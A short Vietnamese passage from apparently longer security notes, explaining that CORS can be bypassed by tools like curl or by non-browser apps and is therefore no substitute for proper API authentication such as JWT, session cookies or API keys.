- Attacker dùng curl bypass CORS trivially
- Mobile apps, desktop apps không có CORS

API phải luôn có proper authentication (JWT, session cookies, API keys) bất kể CORS configuration. CORS chỉ là UX/compatibility mechanism — kiểm soát browser nào được phép dùng API, không phải security boundary thật.
